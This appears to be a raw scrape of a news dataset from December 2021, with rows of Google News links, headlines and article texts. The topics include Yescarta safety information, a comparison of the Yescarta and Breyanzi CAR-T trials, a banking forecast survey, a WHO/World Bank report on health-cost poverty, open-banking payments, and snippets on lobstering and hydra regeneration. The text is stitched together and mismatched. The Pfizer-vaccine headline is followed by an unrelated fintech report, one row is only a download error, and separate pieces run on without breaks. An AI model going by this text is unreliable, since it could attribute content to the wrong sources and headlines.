of CRS at least daily for 7 days at the certified healthcare facility and for 4 weeks thereafter. Counsel patients to seek immediate medical attention should signs or symptoms of CRS occur at any time. At the first sign of CRS institute treatment with supportive care tocilizumab or tocilizumab and corticosteroids as indicated.

NEUROLOGIC TOXICITIES that were fatal or life-threatening occurred. Neurologic toxicities occurred in 81% (206/254) of all patients with NHL receiving Yescarta including Grade ≥3 in 26%. Neurologic toxicities occurred in 87% (94/108) of patients with LBCL including Grade ≥3 in 31%. The median time to onset was 4 days (range: 1-43 days) and the median duration was 17 days for patients with LBCL. Neurologic toxicities occurred in 77% (112/146) of patients with iNHL including Grade ≥3 in 21%. The median time to onset was 6 days (range: 1-79 days) and the median duration was 16 days for patients with iNHL. 98% of all neurologic toxicities in patients with LBCL and 99% of all neurologic toxicities in patients with iNHL occurred within the first 8 weeks of Yescarta infusion. Neurologic toxicities occurred within the first 7 days of infusion for 89% of affected patients with LBCL and 74% of affected patients with iNHL. The most common neurologic toxicities (≥10%) in all patients combined included encephalopathy (53%) headache (45%) tremor (31%) dizziness (20%) delirium (16%) aphasia (15%) and insomnia (11%). Prolonged encephalopathy lasting up to 173 days was noted. Serious events including leukoencephalopathy and seizures as well as fatal and serious cases of cerebral edema have occurred. In a subsequent cohort of LBCL patients who received corticosteroids at the onset of Grade 1 toxicities neurologic toxicities occurred in 78% (32/41) of these patients and 20% (8/41) had Grade 3 neurologic toxicities with no patients experiencing a Grade 4 or 5 event. The median time to onset of neurologic toxicities was 6 days (range: 1-93 days) with a median duration of 8 days (range: 1-144 days). The most common neurologic toxicities were consistent with the overall LBCL population treated with Yescarta. Following Yescarta infusion monitor patients for signs and symptoms of neurologic toxicities at least daily for 7 days at the certified healthcare facility and for 4 weeks thereafter and treat promptly.

REMS: Because of the risk of CRS and neurologic toxicities Yescarta is available only through a restricted program called the Yescarta and Tecartus REMS Program which requires that: Healthcare facilities that dispense and administer Yescarta must be enrolled and comply with the REMS requirements and must have on-site immediate access to a minimum of 2 doses of tocilizumab for each patient for infusion within 2 hours after Yescarta infusion if needed for treatment of CRS. Certified healthcare facilities must ensure that healthcare providers who prescribe dispense or administer Yescarta are trained about the management of CRS and neurologic toxicities. Further information is available at www.YescartaTecartusREMS.com or 1-844-454-KITE (5483).

HYPERSENSITIVITY REACTIONS: Allergic reactions including serious hypersensitivity reactions or anaphylaxis may occur with the infusion of Yescarta.

SERIOUS INFECTIONS: Severe or life-threatening infections occurred. Infections (all grades) occurred in 47% (119/254) of all patients with NHL. Grade ≥3 infections occurred in 19% of patients Grade ≥3 infections with an unspecified pathogen occurred in 15% bacterial infections in 5% viral infections in 2% and fungal infections in 1%. Yescarta should not be administered to patients with clinically significant active systemic infections. Monitor patients for signs and symptoms of infection before and after infusion and treat appropriately. Administer prophylactic anti-microbials according to local guidelines. Febrile neutropenia was observed in 40% of all patients with NHL and may be concurrent with CRS. In the event of febrile neutropenia evaluate for infection and manage with broad-spectrum antibiotics fluids and other supportive care as medically indicated. In immunosuppressed patients including those who have received Yescarta life-threatening and fatal opportunistic infections including disseminated fungal infections (e.g. candida sepsis and aspergillus infections) and viral reactivation (e.g. human herpes virus-6 [HHV-6] encephalitis and JC virus progressive multifocal leukoencephalopathy [PML]) have been reported. The possibility of HHV-6 encephalitis and PML should be considered in immunosuppressed patients with neurologic events and appropriate diagnostic evaluations should be performed. Hepatitis B virus (HBV) reactivation in some cases resulting in fulminant hepatitis hepatic failure and death can occur in patients treated with drugs directed against B cells. Perform screening for HBV HCV and HIV in accordance with clinical guidelines before collection of cells for manufacturing.

PROLONGED CYTOPENIAS: Patients may exhibit cytopenias for several weeks following lymphodepleting chemotherapy and Yescarta infusion. Grade ≥3 cytopenias not resolved by Day 30 following Yescarta infusion occurred in 30% of all patients with NHL and included neutropenia (22%) thrombocytopenia (13%) and anemia (5%). Monitor blood counts after infusion.

HYPOGAMMAGLOBULINEMIA and B-cell aplasia can occur. Hypogammaglobulinemia occurred in 17% of all patients with NHL. Monitor immunoglobulin levels after treatment and manage using infection precautions antibiotic prophylaxis and immunoglobulin replacement. The safety of immunization with live viral vaccines during or following Yescarta treatment has not been studied. Vaccination with live virus vaccines is not recommended for at least 6 weeks prior to the start of lymphodepleting chemotherapy during Yescarta treatment and until immune recovery following treatment.

SECONDARY MALIGNANCIES may develop. Monitor life-long for secondary malignancies. In the event that one occurs contact Kite at 1-844-454-KITE (5483) to obtain instructions on patient samples to collect for testing.

EFFECTS ON ABILITY TO DRIVE AND USE MACHINES: Due to the potential for neurologic events including altered mental status or seizures patients are at risk for altered or decreased consciousness or coordination in the 8 weeks following Yescarta infusion. Advise patients to refrain from driving and engaging in hazardous occupations or activities such as operating heavy or potentially dangerous machinery during this initial period.

ADVERSE REACTIONS: The most common adverse reactions (incidence ≥20%) in patients with LBCL included CRS fever hypotension encephalopathy tachycardia fatigue headache decreased appetite chills diarrhea febrile neutropenia infections with pathogen unspecified nausea hypoxia tremor cough vomiting dizziness constipation and cardiac arrhythmias. The most common non-laboratory adverse reactions (incidence ≥20%) in patients with iNHL included fever CRS hypotension encephalopathy fatigue headache infections with pathogen unspecified tachycardia febrile neutropenia musculoskeletal pain nausea tremor chills diarrhea constipation decreased appetite cough vomiting hypoxia arrhythmia and dizziness.

But debate could ensue over which drug turned in better results.

Back in June BMS’ Breyanzi became the first CAR-T medicine to post a trial win against standard of care in large B-cell lymphoma (LBCL) patients who had failed just one prior therapy. Specifically in data unveiled Saturday at the American Society of Hematology (ASH) annual meeting investigators said the medicine cut the risk of a so-called event-free survival (EFS) complication by 65.1% in a phase 3 study.

Breyanzi’s magnitude of improvement looks largely in line with a 60.2% showing on a similar EFS measurement that Kite’s Yescarta had previously reported—and confirmed at the ASH event—in its own phase 3 trial in the same second-line LBCL setting.

The FDA has put an application for that Yescarta use under priority review with a target decision date set for April 1 2022 according to Gilead. As for Breyanzi BMS is completing a full evaluation of its data with the intention to file them with regulatory agencies Anne Kerber the company’s head of cell therapy development told Fierce Pharma in an interview.

With the phase 3 data from the ZUMA-7 trial for Yescarta and TRANSFORM trial for Breyanzi CAR-T drugs are now a “juggernaut” that will change more than 20 years of established practice and replace a regimen of high-dose chemotherapy followed by hematopoietic stem cell transplant as the new standard of care for second-line LBCL Jason Westin M.D. the leader of LBCL research at the MD Anderson Cancer Center said in a separate interview. Westin is an investigator in ZUMA-7 and BELINDA which is Novartis’ failed second-line trial for Kymriah.

RELATED: Bristol Myers' cell therapy Breyanzi fresh off an FDA nod eyes earlier lymphoma use with first-in-class win

Gilead’s Yescarta appears to have an upper hand in the battle for CAR-T supremacy given its three-year head start over Bristol’s Breyanzi. In a recent survey Cowen conducted with 20 lymphoma-treating doctors after BMS and Gilead had touted their second-line wins 60% of oncologists chose Yescarta or Gilead’s newer Tecartus as their likely favored CD19 CAR-T product in 2024. Breyanzi was selected by 25% of doctors the analysts said.

Industry experts Cowen spoke with separately suggested they would consider Breyanzi in less-fit patients because of the potentially higher rate of neurotoxicity associated with Yescarta. They would also use the BMS drug in cases where Yescarta manufacturing slots aren’t available as a result of increased demand.

But before the two CAR-T products potentially move up the treatment ladder doctors may want to debate which drug has the better data.

Longer follow-up and larger population

At first glance Breyanzi’s 65.1% advantage on the EFS measurement looks better than Yescarta’s 60.2%. But the Yescarta number came from a median follow-up of over two years while Breyanzi reported an interim analysis of the TRANSFORM trial with 6.2 months of median follow-up.

Kite designed the trial under the FDA's guidance CEO Christi Shaw said in an interview.

“Ours is not an interim look it’s a final outcome with two-year data that we can solidly say this is what just Yescarta does for patients if you use in the second line” she said.

Still MD Anderson’s Westin pointed out that longer follow-up might not make much of a difference because LBCL is a highly aggressive cancer where disease-worsening events tend to happen quite early. Prior studies have typically showed that a CAR-T therapy’s advantage would really show at about six months he noted.

Since the TRANSFORM analysis has passed that point “I think those data are probably mature enough” he argued. “But we do need more follow-up to be sure of it.”

RELATED: Gilead's Kite matches Bristol Myers with Yescarta CAR-T win in earlier lymphoma

Kite's Shaw also touted ZUMA-7 for being the larger trial of the two; TRANSFORM randomized 184 patients while ZUMA-7 enrolled 359 patients.

For her part Kerber argued BMS having already expected a large benefit for Breyanzi “effectively designed … the sample size to avoid too many patients being randomized to an inferior standard of care.”

As for the short follow-up time Kerber said the current data package which also includes results showing Breyanzi trumped standard of care in other markers such as tumor response rate “is so consistent and so compelling that there is no ambiguity in the data.”

Bridging chemo

Another reason why BMS’ Breyanzi could need a longer follow-up lies in its trial design Frank Neumann M.D. Ph.D. Kite’s head of clinical development said during an interview. Unlike Yescarta’s ZUMA-7 trial Breyanzi patients in the TRANSFORM study were allowed to take chemotherapy as bridging treatment before they got the CAR-T.

Neumann compared the Breyanzi protocol to giving someone a head start in a race arguing the extra use of chemo masked Breyanzi’s effect.

“I would definitely consider waiting for their data to get more mature” after the chemotherapy effect potentially wanes off he said.

But BMS’ Kerber said allowing chemo bridging was a way to reach a more diverse patient population. Existing CAR-T drugs aren’t off-the-shelf products. Treatment centers take a patient’s own T cells and send them to manufacturing sites to be processed. The final product will then be shipped back to the center for infusion. The process could take around a month or even longer.

With bridging therapy patients with the most aggressive disease could still enroll in the study Kerber said. The initial chemo use is intended to control the disease and to “widen the spectrum of patients that can be enrolled” she added.

RELATED: Novartis' Kymriah flops in earlier lymphoma use where Gilead Bristol Myers CAR-T rivals succeeded

MD Anderson’s Westin acknowledged the possibility that the lack of bridging chemo might deter people who can’t wait for cells to be manufactured and returned but that didn’t seem to affect ZUMA-7. The two studies enrolled similar percentage of patients—both at about 74%—who were refractory to first-line treatment which is a surrogate for really aggressive disease he noted.

What’s more Novartis’ Kymriah failed in its second-line trial despite allowing for the use of bridging chemo he added.

“Although that is a structural difference in the trials I don’t think we can blame or attribute the outcomes of the studies to the bridging chemotherapy” Westin said.

Difference in event-free survival definition

Another difference between ZUMA-7 and TRANSFORM is their descriptions for the primary endpoint of event-free survival. Both trials count disease progression death or start of a new therapy for EFS. But unlike ZUMA-7 TRANSFORM also includes failure to achieve complete response or partial response as an EFS event.

Westin once again pointed to LBCL being an “explosive cancer” noting that stable disease isn’t common. Patients who don’t respond well to treatment would quickly progress to another therapy. Therefore the difference in EFS description isn’t meaningful he said.

All considered because the outcomes Yescarta and Breyanzi have each shown are “very impressive” Westin said he would like to start the CAR-Ts as the new standard of care in second-line patients that would have been eligible for the ZUMA-7 or TRANSFORM studies once the drugs cross the FDA finish line in the indication.",https://news.google.com/articles/CBMicWh0dHBzOi8vd3d3LmJsb29tYmVyZy5jb20vbmV3cy9hcnRpY2xlcy8yMDIxLTEyLTEyL2JpbGxpb25haXJlLXMtYmV0LW9uLXBmaXplci12YWNjaW5lLWZvci1jaGluYS1mYWlscy10by1wYXktb2Zm0gEA?hl=en-US&gl=US&ceid=US%3Aen,Billionaire's Bet on Pfizer Vaccine for China Fails to Pay Off,"As Covid-19 started spreading in Wuhan early last year Chinese billionaire Guo Guangchang ’s drugmaker appeared to have scored a big win: A partnership with Germany’s BioNTech SE which went on to produce with Pfizer Inc. one of the world’s most successful vaccines against the coronavirus.

In response consumers have diversified the financial institutions they work with building their own open banking style of portfolio of savings borrowing payments and investment apps to better serve their needs.

Now that many of the first fintech firms such as PayPal Square and others are achieving scale they are offering expanded financial services as many seek to provide ‘super app’ functionality for stronger customer engagement and loyalty. The question becomes what will consumers do next? How do they want to manage their finances their privacy and their daily lives? Most importantly what will the value transfer between financial firms and the consumer be in the future?

To answer these and many other questions facing financial institutions the Digital Banking Report asked people in the industry to provide their projections as to what will happen in the future … and when? Our global research study included not only banks and credit unions but other financial services providers including fintech firms third-party solution providers as well as advisors and consultants to the banking industry.

The research focused on 14 perspectives — shown in the first chart below — within four areas of banking:

Competition and Consolidation

Modern Technologies

Payments

Digital Transformation

While the insights collected were enlightening they obviously need to be taken within the context that no specific component of financial services can be viewed with certainty. The pandemic taught us that for sure. That said the projected speed of adoption of some projections (e.g. use of cloud computing and industry consolidation) can’t be ignored. Likewise the slowness of other projections (e.g. impact of social responsibility and use of crypto) should not be assumed.

Banking is Transforming at Different Speeds

One of the biggest takeaways from our research is that not all changes that are regarded as ‘inevitable’ in the banking industry are expected to happen at the same time … if at all.

As can be seen in the chart below the greatest consensus among retail bankers was around the likelihood of significant branch consolidation. The research showed that almost four in ten executives who responded to the survey thought there would be a 25% consolidation by 2025 (just four years from now).

Another 47% believed this level of consolidation would happen by 2030. Compared to all of the other projections this had the lowest number of respondents thinking it would happen after 2030 or not at all.

Crystal Ball Highlights:

Speed of change will be rapid in branch consolidation and cloud computing much slower in crypto as a payment and blockchain.

On the other end of the spectrum the least number of respondents saw cryptocurrencies being used more than cash in the near or mid-term with the highest number of respondents seeing cryptocurrencies surpassing cash use after 2030.

In between a ‘barbell’ response range was seen when we asked financial industry executives whether consumers would select their financial institution based on social and environmental issues. While 47% saw this happening before 2030 a similar percentage (53%) saw this consumer trend happening beyond 2030 or not at all. In fact the ‘not at all’ perspective was the highest of all projections.

Competition Drives Consolidation

While the economy is recovering from the impact of the pandemic and the vast majority of traditional financial institutions are enjoying strong earnings competition in banking has never been more intense. In fact JPMorgan Chase’s CEO Jamie Dimon said in his annual shareholder’s letter that traditional banks are playing an increasingly smaller role in the financial system as big tech and fintech firms continue to grow.

“It is completely clear that increasingly many banking products such as payments and certain forms of deposits among others are moving out of the banking system. In addition lending in many forms – including mortgage student leveraged consumer and non-credit card consumer – is moving out of the banking system” he wrote. This perspective is reflected in the responses provided in our research.

While not believed to be the most imminent scenario by 2025 almost three-quarters of executives surveyed thought that at least two fintech or big tech firms will be a top ten of financial institution provider (in terms of assets) by 2030. Only 5% of organizations didn’t expect this ever to occur. More than half the institutions surveyed also expected more than half of the top ten financial services firms to use open banking functionality to combine banking with non-banking services by 2030.

Ready or Not:

Nearly three quarters of financial executives expect a fintech or big tech firm to be a top ten financial institution in less than a decade.

As established financial institutions increasingly need to move at digital speed to deliver startup-like innovations and as fintech firms search for scale of business there will increasingly be partnerships and collaborations between these types of entities as well as the increasing use of third-party providers to deliver solutions in weeks and months as opposed to the legacy method of ‘annual innovation deployment’.

While there is a great deal of discussion in the industry around the commitment of the banking industry to environmental social and governance (ESG) issues there is a lack of consensus as to whether consumers will actually select a banking partner based on these issues as noted above. Because of the interesting split of opinion in this area it will be interesting to watch whether consumers actually take action based on their stated belief around social and environmental issues.

The changing competitive landscape is reflected in the responses to trends around banking consolidation. While many of the competitive and consolidation trends began more than a decade ago the landscape has changed at an even more rapid and dramatic pace since the onset of the pandemic. The benefits of innovation new product development the economic benefit of digital distribution and engagement and the use of data and analytics can’t be over emphasized.

These forces are resulting in 71% of financial executives projecting a 25% consolidation of banks by 2030 and 85% of executives projecting a similar consolidation in the same period. In fact almost four in ten executives expect 25% of branches to be gone in four years.

Banking’s New Metrics:

The survival of many financial institutions will not be defined by how they cut costs but how they innovate and serve the customer with a ‘challenger mindset’.

Despite the benefits of large existing customer bases economies of scale strong balance sheets and trusted legacy brands traditional banks and credit unions can’t assume a successful future is guaranteed. Instead all traditional financial institutions must embrace a ‘competitive mindset’ that can help to future-proof organizations from the nimble new players that are focusing on combining data and digital delivery to meet customer needs.

No longer is cutting costs enough for success in an environment controlled by consumers and small businesses who want you to know them understand them and provide a strong value transfer for their loyalty.

Deployment of Modern Technologies

When looking at technology trends for 2022 Gartner VP Analyst David Groombridge states “CEOs know they must accelerate the adoption of digital business and are seeking more direct digital routes to connect with their customers. But with an eye on future economic risks they also want to be efficient and protect margins and cash flow.”

Virtually every financial institution knows the need to use data AI and other applied analytics to drive results but we consciously decided to avoid any projections around timing of deployment since our recent research indicates a very long-term path to maturity. As a result we focused on the deployment of cloud solutions IoT solutions virtual and augmented reality and blockchain technology.

Banks Not Prioritizing Technology:

With the exception of cloud computing the timeframes expected for the deployment of many modern technologies is slower than expected.

While we weren’t surprised by the projections that cloud computing will become commonplace by 2030 (or sooner) we were surprised by the conservative timings for the use of blockchain where only 9% of organizations surveyed believed blockchain technology would be used by 75% of organizations by 2025 an additional 43% by 2030 and 41% had a projection of a longer-term deployment.

Continuation of Turbulence in Payments

In no sector has the impact of competition economic downturn regulation digital transformation and consumer behavior been greater than in payments. The payments sector experienced its first revenue contraction in more than a decade as consumers went into seclusion and businesses closed.

But similar to many of the changes projected in our research the pandemic reinforced shifts that were already in play. For instance the importance of speed of payments decline in the use of cash and the accelerated migration from in-store to online commerce all created new opportunities as well as challenges for all players in the financial space.

Payments Exodus:

By 2030 more than half of all payment transactions will be initiated by nonbank players predict 78% of industry executives.

Even as we approach the third anniversary of the onset of the pandemic it is unclear which payment trends will revert to what was seen before the pandemic and which will be permanent. Nonetheless it is clear that the trend towards faster payments and less cash will continue. The integration of payments solutions within retail platforms for embedded commerce also does not seem to be temporary.

According to McKinsey “The process of reexamining long-standing payments value propositions is already under way. While old tenets still hold true – scale still matters and ‘owning’ the customer relationship remains important for instance – sticking to them is no longer sufficient to ensure success.

Future of Digital Banking Transformation

Research done by the Digital Banking Report has found that traditional financial institutions now rank themselves lower on the digital transformation maturity scale than they did in 2019. The reason for this retreat despite massive commitments to digital banking transformation is the speed of change in consumer expectations industry competition and innovation.

When we asked financial executives about the possibility of a move from a product-centric business model to a customer-centric model where checking savings and lending are combined as an integrated solution only 23% of those surveyed saw this happening by 2025 with a modest 38% saying it would happen by 2030.

Not surprisingly more of those surveyed saw increased economies from digital transformation in the near-term with nearly three-quarters of executives believing a cost-to-income improvement of more than 20% will be achieved by 2030.

If we had asked about the future of banking before the pandemic many of the projections would have underestimated where we would be today. It is possible some of the projections made in this research may prove to be overly aggressive. The opposite is also true. In any case as stated by Forrester’s Jacob Morgan “Future banking will be invisible connected insights-driven and purposeful.” We agree.",https://news.google.com/articles/CBMicmh0dHBzOi8vd3d3LnJldXRlcnMuY29tL3dvcmxkL2JpZGVuLXdhcm5zLXB1dGluLXJ1c3NpYS13aWxsLXBheS1hLXRlcnJpYmxlLXByaWNlLWlmLWl0LWludmFkZXMtdWtyYWluZS0yMDIxLTEyLTExL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Biden warns Putin: Russia will pay 'terrible price' if it invades Ukraine,ERROR: Article `download()` failed with 401 Client Error: HTTP Forbidden for url: https://www.reuters.com/world/biden-warns-putin-russia-will-pay-a-terrible-price-if-it-invades-ukraine-2021-12-11/ on URL https://news.google.com/articles/CBMicmh0dHBzOi8vd3d3LnJldXRlcnMuY29tL3dvcmxkL2JpZGVuLXdhcm5zLXB1dGluLXJ1c3NpYS13aWxsLXBheS1hLXRlcnJpYmxlLXByaWNlLWlmLWl0LWludmFkZXMtdWtyYWluZS0yMDIxLTEyLTExL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMiLGh0dHBzOi8vbmV3cy51bi5vcmcvZW4vc3RvcnkvMjAyMS8xMi8xMTA3NzUy0gEA?hl=en-US&gl=US&ceid=US%3Aen,More than half a billion pushed into extreme poverty due to health costs,"The findings launched on International Universal Health Coverage Day highlighting the devastating impact of COVID-19 on people’s ability to obtain healthcare and pay for it.

Tweet URL The #COVID19 pandemic has made it increasingly difficult for people to pay for care. Even before the pandemic half a billion people were being pushed into extreme poverty as they had to pay for health care out of their own pockets. #UHCday pic.twitter.com/hPDqBxbLTe World Health Organization (WHO) WHO

In his message marking the Day UN Secretary-General António Guterres said that with the third year of the pandemic fast approaching “we must urgently strengthen our health systems to ensure they are equitable resilient and capable of meeting everyone’s needs including for their mental health.”

Shockwaves

He added that “the shockwaves of this health emergency are hitting hardest those countries that lack health systems capable of providing quality affordable care for all.”

If the world is to reach the goal of achieving universal health coverage by 2030 there needs to be greater commitment from governments to investing in and scaling up proven solutions.

“This means making more and smarter investments in the foundations of health systems with an emphasis on primary health care essential services and marginalized populations” said Mr Guterres.

The best insurance for resilient economies and communities is strengthening health systems before crises emerge. “The unequal distribution of COVID-19 vaccines in the past year has been a global moral failure. We must learn from this experience. The pandemic will not end for any country until it ends for every country” said the UN chief.

Stresses and strains

In 2020 the pandemic disrupted health services and stretched countries’ health systems beyond their limits. As a result for example immunization coverage dropped for the first time in ten years and deaths from TB and malaria increased said the news release from WHO and the World Bank.

The pandemic also triggered the worst economic crisis since the 1930s making it increasingly difficult for people to pay for lifesaving healthcare.

“Even before the pandemic half a billion people were being pushed (or pushed still further) into extreme poverty because of payments they made for healthcare. The organizations expect that that number is now considerably higher.

“There is no time to spare” said WHO chief Tedros Adhanom Ghebreyesus. “All governments must immediately resume and accelerate efforts to ensure every one of their citizens can access health services without fear of the financial consequences.

“This means strengthening public spending on health and social support and increasing their focus on primary health care systems that can provide essential care close to home.”

Faltering progress

“Prior to the pandemic many countries had made progress. But it was not robust enough. This time we must build health systems that are strong enough to withstand shocks such as the next pandemic and stay on course towards universal health coverage.”

The new WHO/World Bank reports also warn that financial hardship is likely to become more intense as poverty grows incomes fall and governments face tighter fiscal constraints.

“Even before the COVID-19 pandemic struck almost 1 billion people were spending more than 10 per cent of their household budget on health” said Juan Pablo Uribe Global Director for Health Nutrition and Population World Bank. “This is not acceptable especially since the poorest people are hit hardest. Within a constrained fiscal space governments will have to make tough choices to protect and increase health budgets” he added.

In the first two decades of this century many governments had made progress on service coverage said WHO and the World Bank.

In 2019 prior to the pandemic 68 per cent of the world’s population was covered by essential health services such as reproductive health services; immunization services; treatment for HIV TB and malaria; and services to diagnose and treat noncommunicable diseases like cancer heart conditions and diabetes.

But they had not made care more affordable. “As a result the poorest groups and those living in rural areas are the least able to obtain health services and the least likely to be able to cope with the consequences of paying for them.”",https://news.google.com/articles/CBMiW2h0dHBzOi8vZmludGVjaG1hZ2F6aW5lLmNvbS9iYW5raW5nL3ZhcmlhYmxlLXJlY3VycmluZy1wYXltZW50cy12cnBzLXRyYW5zZm9ybWF0aXZlLWZpbnRlY2jSAQA?hl=en-US&gl=US&ceid=US%3Aen,Variable Recurring Payments (VRPs): A Transformative Fintech,"Variable Recurring Payments (VRPs) are the most significant development in open banking to date. Why? Because they tackle one of its biggest challenges: the requirement for consent via Strong Customer Authentication (SCA) for every transaction.

VRP effectively delegates authentication to a third-party provider (TPP) like Volt which then enables a single-click payment experience for trusted beneficiaries. This impact is expected to be seriously disruptive to the status quo.

VRP has thus far been mandated for Sweeping use-cases only – this means transactions between two accounts in the same name. Notably though in building VRP for that Sweeping use-case the banks have created the infrastructure needed to support first party to third party transactions.

This will enable customers to use VRP for everything from subscriptions to in-app payments and for e-commerce more broadly. Card-on-file will be replaced by account-on-file; direct debits that are antiquated and with a problematic operating interface are at risk of being consigned to history.

How does VRPs work?

VRP provides for a long-life consent token via three parameters: the maximum number of transactions in a given period (a month for example) the maximum value of any single transaction and the total aggregate value of all transactions in that period.

So if your weekly online groceries order never exceeds £200 that's your maximum transaction value. Five times £200 is £1000 so that's your maximum number of transactions and their total aggregate value for the month. And if transactions stay within these limits there's no requirement for SCA.

What do customers stand to gain from VRP?

Aside from being faster and more secure – never again will customers be asked to update their credit or debit card information. Cards expire; bank accounts do not. VRPs also offers customers more convenience control and security.

Whilst open payments may be in their relative infancy strong adoption and growth are evident. VRP and the benefits it brings will only accelerate this.

What does VRP mean for merchants?

The benefits of VRP for merchants are plentiful: real-time settlements lower costs the elimination of card fraud reduced customer churn and no chargebacks.

These and other benefits are being tested in earnest at the world's first VRP Hackathon - for which Volt is a proud sponsor alongside Mastercard Accenture and Worldpay. Hosted by Ozone API Open Future World and UK Finance the event is seeing more than 100 participants putting VRP through its paces and exploring use cases via a transactional sandbox.

Collaboration is crucial to realise VRP's full potential. The fintech industry is working to bring VRP to market via a commercial or premium API model. To succeed there needs to be agreements between TPPs like Volt and banks about what a commercial VRP model looks like and what they're working to achieve.

'The opportunity for banks to monetise open banking'

Banks have had to spend hundreds of millions of pounds delivering open banking and the requirements of PSD2 with no means to monetise it.

VRP can be the first opportunity for banks to monetise their open banking investment and provide balance to the open banking ecosystem. This effect is hugely positive.

Ultimately open banking is a handshake between banks and TPPs. It's essential therefore that these industry players continue to work together on initiatives that further the functionality set of open banking and the opportunities it presents.

VRP is one such model for this collaboration and represents a significant opportunity to bring a fairer distribution of value across the ecosystem. This new partnership between the fintechs and banks will level the playing field as we work together to deliver on the full promise of real-time payments everywhere.

DUBAI/GENEVA/WASHINGTON DC — 12 December 2021 — New evidence compiled by the World Health Organization and the World Bank shows that the COVID-19 pandemic is likely to halt two decades of global progress towards Universal Health Coverage. The organizations also reveal that more than half a billion people are being pushed into extreme poverty because they have to pay for health services out of their own pockets.

The findings are contained in two complementary reports launched on Universal Health Coverage Day highlighting the devastating impact of COVID-19 on people’s ability to obtain health care and pay for it.

In 2020 the pandemic disrupted health services and stretched countries’ health systems beyond their limits as they struggled to deal with the impact of COVID-19. As a result for example immunization coverage dropped for the first time in ten years and deaths from TB and malaria increased.

The pandemic also triggered the worst economic crisis since the 1930s making it increasingly difficult for people to pay for care. Even before the pandemic half a billion people were being pushed (or pushed still further) into extreme poverty because of payments they made for health care. The organizations expect that that number is now considerably higher.

“There is no time to spare” said Dr Tedros Adhanom Ghebreyesus WHO Director-General. “All governments must immediately resume and accelerate efforts to ensure every one of their citizens can access health services without fear of the financial consequences. This means strengthening public spending on health and social support and increasing their focus on primary health care systems that can provide essential care close to home.”

He added: “Prior to the pandemic many countries had made progress. But it was not robust enough. This time we must build health systems that are strong enough to withstand shocks such as the next pandemic and stay on course towards universal health coverage.”

The new WHO/World Bank reports also warn that financial hardship is likely to become more intense as poverty grows incomes fall and governments face tighter fiscal constraints.

“Even before the COVID-19 pandemic struck almost 1 billion people were spending more than 10 per cent of their household budget on health” said Juan Pablo Uribe Global Director for Health Nutrition and Population World Bank. “This is not acceptable especially since the poorest people are hit hardest. Within a constrained fiscal space governments will have to make tough choices to protect and increase health budgets” he added.

In the first two decades of this century many governments had made progress on service coverage. In 2019 prior to the pandemic 68 per cent of the world’s population was covered by essential health services such as pre-and post-natal care and reproductive health services; immunization services; treatment for diseases like HIV TB and malaria; and services to diagnose and treat noncommunicable diseases like cancer heart conditions and diabetes.

But they had not made such advances in ensuring affordability. As a result the poorest groups and those living in rural areas are the least able to obtain health services and the least likely to be able to cope with the consequences of paying for them. Up to 90 percent of all households incurring impoverishing out-of-pocket health spending are already at or below the poverty line - underscoring the need to exempt poor people from out-of-pocket health spending backing such measures with health financing policies that enable good intentions to be realized in practice.

Besides the prioritizing of services for poor and vulnerable populations supported through targeted public spending and policies that protect individuals from financial hardship it will also be crucial to improve the collection timeliness and disaggregation of data on access service coverage out-of-pocket health spending and total expenditure. Only when countries have an accurate picture of the way that their health system is performing can they effectively target action to improve the way it meets the needs of all people.

Together these two new reports offer both a warning and guideposts to all countries as they strive to build back better from COVID-19 and keep their populations safe healthy and financially secure.

**World Bank Group Response to COVID-19

Since the start of the COVID-19 pandemic the World Bank Group has deployed over $157 billion to fight the health economic and social impacts of the pandemic the fastest and largest crisis response in its history. The financing is helping more than 100 countries strengthen pandemic preparedness protect the poor and jobs and jump start a climate-friendly recovery. The Bank is also supporting over 60 low- and middle-income countries more than half of which are in Africa with the purchase and deployment of COVID-19 vaccines and is making available $20 billion in financing for this purpose until the end of 2022.

A way of life is on the line but lobstermen can't or won't imagine another.

No news organization is more invested in the health of the Gulf of Maine and the region’s residents than the Portland Press Herald and The Boston Globe. So as the gulf’s warming waters pose an increasingly existential threat to Maine’s signature industry lobster we joined forces to take a hard look at the climate crisis unfolding on our shores.

We descended on the island of Vinalhaven one of Maine’s busiest fishing villages and turned loose reporters photographers and videographers from both news organizations to learn firsthand the challenges stresses and fears of those facing this uniquely perilous time for lobstering. The problems posed by the warming waters were sometimes subtle — the slow migration of whales and lobsters the gradual rise in sea levels. The tensions and stakes were glaring. Climate change gravely threatens the nation’s richest fishery and the communities that depend on it.

The result is The Lobster Trap presented here today. It is a story of a group of Mainers struggling to preserve their way of life in a rapidly changing world. It is also a snapshot of life on the front lines of a monumental crisis no less than last summer’s western wildfires or the rise of extreme flooding events.

It paralyzes and captures prey with a crown of tentacles then draws it in through its mouth (which also serves as its anus). This unsettling creature is a hydra a freshwater-dwelling cnidarian no more than a half-inch long that eats mostly insect larvae and crustaceans. A hydra’s appearance and eating habits alone give it a sci-fi feel but its ability to regenerate its body — even its head — from only a scrap of tissue or pile of cells raises it to another level.

“It’s one of these organisms that’s thought to never die unless you try to kill it or you know starve it to death” Ali Mortazavi a developmental biologist at the University of California Irvine said. A hydra’s regenerative abilities allow it to constantly replace bits of itself so it doesn’t succumb to things like old age or disease. Aside from the immortality perk constant regeneration means a hydra doesn’t have to sweat the small stuff like losing body parts. Give it a few days and it will grow back anything.

Dr. Mortazavi and his colleagues have taken a big step in understanding how a hydra regenerates its head. Their research was published in Genome Biology and Evolution on Wednesday.

To investigate what makes this remarkable feat possible the researchers looked at changes in gene expression — whether a gene is copied from DNA into RNA — throughout the course of hydra head regeneration. This control of gene expression is called epigenetic regulation. Hydras have a genome quite similar to that of species with little regenerative capacity like humans so it’s thought that epigenetic regulation plays a major role in making the hydra’s powers of regeneration possible.",https://news.google.com/articles/CBMiUmh0dHBzOi8vc291dGhzZWF0dGxlZW1lcmFsZC5jb20vMjAyMS8xMi8xMS93ZWVrZW5kLWxvbmctcmVhZHMtdGhlLW1lYW5pbmctb2YtbGlmZS_SAVZodHRwczovL3NvdXRoc2VhdHRsZWVtZXJhbGQuY29tLzIwMjEvMTIvMTEvd2Vla2VuZC1sb25nLXJlYWRzLXRoZS1tZWFuaW5nLW9mLWxpZmUvP2FtcA?hl=en-US&gl=US&ceid=US%3Aen,Weekend Long Reads: The Meaning of Life,"by Kevin Schofield

As we share the December holidays it seems an apt time to ponder the things that bring our lives meaning. This weekend’s “long read” is a recent survey by the Pew Research Center on that very question.

